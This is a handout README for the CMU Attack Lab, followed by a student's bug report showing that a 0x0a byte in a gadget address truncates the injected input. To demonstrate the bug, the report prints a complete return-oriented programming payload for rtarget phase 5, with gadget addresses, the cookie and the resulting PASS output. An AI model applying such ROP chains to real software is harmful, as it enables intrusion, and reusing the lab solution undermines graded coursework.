## Handout

This file contains materials for one instance of the attacklab.

Files:

    ctarget

Linux binary with code-injection vulnerability.  To be used for phases
1-3 of the assignment.

    rtarget

Linux binary with return-oriented programming vulnerability.  To be
used for phases 4-5 of the assignment.

     cookie.txt

Text file containing 4-byte signature required for this lab instance.

     farm.c

Source code for gadget farm present in this instance of rtarget.  You
can compile (use flag -Og) and disassemble it to look for gadgets.

     hex2raw

Utility program to generate byte sequences.  See documentation in lab
handout.

## Bug Report by L1997i

In rtarget **Phase 3** of *Attack Lab* ***[Updated 1/11/16]***, which involving a code injection attack, if some of students want to use a return address containing `0x0a` in their target injection codes, then `getbuf()` may parse `0x0a` as `newline` which leads to **termination of the injection codes behind**. Since each students in CMU has their only attack targets which are built **automatically**, if some of the targets are built with address in gadgets farm they need containing `0x0a`, it will unfortunately stop students from implementing injection attacks.

## Steps to reproduce bug

1. My injection attacks solution in asm code

   ```asm
   movq %rsp, %rax
   movq %rax, %rdi
   popq %rax 			# %rax = $0x48 after popping
   movl %eax, %edx
   movl %edx, %ecx
   movl %ecx, %esi
   lea (%rdi, %rsi, 1), %rax
   movq %rax, %rdi
   # call <touch3>
   # store cookie here
   ```

2. `objdump -d rtarget > rtarget.s`. Following is part of codes in `rtarget.s` Here I want to add `%rdi` and` %rsi` to `%rax`, so I will have the beginning address of `<add_xy>` (`0x401b0a`) in my injection codes. 

   ```asm
   0000000000401b04 <mid_farm>:
     401b04:	b8 01 00 00 00       	mov    $0x1,%eax
     401b09:	c3                   	retq   
   
   0000000000401b0a <add_xy>:
     401b0a:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
     401b0e:	c3                   	retq   
   ```


3. Then I got my injection codes as follow, saving as `rp5.txt`.

   ```asm
   55 55 55 55 55 55 55 55     /* padding content */
   44 44 44 44 44 44 44 44     /* padding content */
   33 33 33 33 33 33 33 33     /* padding content */
   22 22 22 22 22 22 22 22     /* padding content */
   11 11 11 11 11 11 11 11     /* padding content */
   70 1b 40 00 00 00 00 00     /* RA1: 0x401b70 - movq %rsp, %rax */
   d6 1a 40 00 00 00 00 00     /* RA2: 0x401ad6 - movq %rax, %rdi */
   f4 1a 40 00 00 00 00 00     /* RA3: 0x401af4 - popq %rax */
   48 00 00 00 00 00 00 00     /* cookie addr offsets - %rax = $0x48 afer popping */
   26 1b 40 00 00 00 00 00     /* RA4: 0x401b26 - movl %eax, %edx */
   ac 1b 40 00 00 00 00 00     /* RA5: 0x401bac - movl %edx, %ecx */
   b3 1b 40 00 00 00 00 00     /* RA6: 0x401bb3 - movl %ecx, %esi */
   0a 1b 40 00 00 00 00 00     /* RA7: 0x401b0a - lea (%rdi, %rsi, 1), %rax */
   d6 1a 40 00 00 00 00 00     /* RA8: 0x401ad6 - movq %rax, %rdi */
   32 1a 40 00 00 00 00 00     /* RA: 0x401a32<touch3> */
   34 63 39 32 61 65 36 38     /* cookie */
   00 00 00 00 00 00 00 00     /* cookie end flag(0x00) */
   ```

4. run `./hex2raw < rp5.txt > rp5`, and test with ` ./rtarget -qi rp5`, here is the result:

   ```asm
   Cookie: 0x4c92ae68
   Ouch!: You caused a segmentation fault!
   Better luck next time
   FAIL: Would have posted the following:
           user id 1551044@student.hcmus.edu.vn
           course  15213-f15
           lab     attacklab
           result  37:FAIL:0xffffffff:rtarget:0:55 55 55 55 55 55 55 55 44 44 44 44 44
   44 44 44 33 33 33 33 33 33 33 33 22 22 22 22 22 22 22 22 11 11 11 11 11 11 11 11 70
   1B 40 00 00 00 00 00 D6 1A 40 00 00 00 00 00 F4 1A 40 00 00 00 00 00 48 00 00 00 00 
   00 00 00 26 1B 40 00 00 00 00 00 AC 1B 40 00 00 00 00 00 B3 1B 40 00 00 00 00 00 
   ```

5. As we can see in the result, the injection codes after `0x0a` **has been terminated**, `getbuf()` only catch codes before `0x0a`. In this case `B3 1B 40 00 00 00 00 00` is the last return address.

    


## Avoid having the return address containing `0x0a`


To further confirm my conjecture, I modify my `rtarget` in binary form by `Synalyze It! Pro` (a tool on MacOS). Following is what I have done: 

1. Remove 1 byte in `0x401b08` which has the value `0x00` in it, and add  the value `0x90`(nop, doing nothing) before `0xc3` in `<add_xy>`. By doing so, the beginning address of `<add_xy>` moves forward by 1 bytes, but ends at the same address. Save the file as `rtarget_modified`.

2. `objdump -d rtarget_modified > rtarget_modified.s`. The `<add_xy>` function in `rtarget_modified.s` file is as follow:

   ```asm
   0000000000401b04 <mid_farm>:
     401b04:	b8 01 00 00 c3       	mov    $0xc3000001,%eax
     401b09:	48                   	rex.W
   
   0000000000401b0a <add_xy>:
     401b0a:	8d 04 37             	lea    (%rdi,%rsi,1),%eax
     401b0d:	90                   	nop
     401b0e:	c3                   	retq   
   ```

3.  After modification, the beginning address of `<add_xy>` function has been modified to `0x401b09`, which doesn't contain `0x0a` in it, so my injection codes modified as follow, saving as `rp5_modified.txt`.

```asm
55 55 55 55 55 55 55 55     /* padding content */
44 44 44 44 44 44 44 44     /* padding content */
33 33 33 33 33 33 33 33     /* padding content */
22 22 22 22 22 22 22 22     /* padding content */
11 11 11 11 11 11 11 11     /* padding content */
70 1b 40 00 00 00 00 00     /* RA1: 0x401b70 - movq %rsp, %rax */
d6 1a 40 00 00 00 00 00     /* RA2: 0x401ad6 - movq %rax, %rdi */
f4 1a 40 00 00 00 00 00     /* RA3: 0x401af4 - popq %rax */
48 00 00 00 00 00 00 00     /* cookie addr offsets - %rax = $0x48 afer popping */
26 1b 40 00 00 00 00 00     /* RA4: 0x401b26 - movl %eax, %edx */
ac 1b 40 00 00 00 00 00     /* RA5: 0x401bac - movl %edx, %ecx */
b3 1b 40 00 00 00 00 00     /* RA6: 0x401bb3 - movl %ecx, %esi */
09 1b 40 00 00 00 00 00     /* RA7: 0x401b09 - lea (%rdi, %rsi, 1), %rax */
d6 1a 40 00 00 00 00 00     /* RA8: 0x401ad6 - movq %rax, %rdi */
32 1a 40 00 00 00 00 00     /* RA: 0x401a32<touch3> */
34 63 39 32 61 65 36 38     /* cookie */
00 00 00 00 00 00 00 00     /* cookie end flag(0x00) */
```

4. run `./hex2raw < rp5_modified.txt > rp5_modified`, and then test with ` ./rtarget_modified -qi rp5_modified`, here is the result:

   ```asm
   Cookie: 0x4c92ae68
   Touch3!: You called touch3("4c92ae68")
   Valid solution for level 3 with target rtarget
   PASS: Would have posted the following:
           user id 1551044@student.hcmus.edu.vn
           course  15213-f15
           lab     attacklab
           result  37:PASS:0xffffffff:rtarget:3:55 55 55 55 55 55 55 55 44 44 44 44 44
   44 44 44 33 33 33 33 33 33 33 33 22 22 22 22 22 22 22 22 11 11 11 11 11 11 11 11 70
   1B 40 00 00 00 00 00 D6 1A 40 00 00 00 00 00 F4 1A 40 00 00 00 00 00 48 00 00 00 00
   00 00 00 26 1B 40 00 00 00 00 00 AC 1B 40 00 00 00 00 00 B3 1B 40 00 00 00 00 00 09
   1B 40 00 00 00 00 00 D6 1A 40 00 00 00 00 00 32 1A 40 00 00 00 00 00 34 63 39 32 61
   65 36 38 00 00 00 00 00 00 00 00 
   ```

5.    The result says it's a valid solution after modifying the address of `<add_xy>` function. Since each students has their only attack targets in CMU, which are built **automatically**, if the targets are built with some of its address in gadgets farm containing `0x0a`, it will stop students from implementing injection attacks.
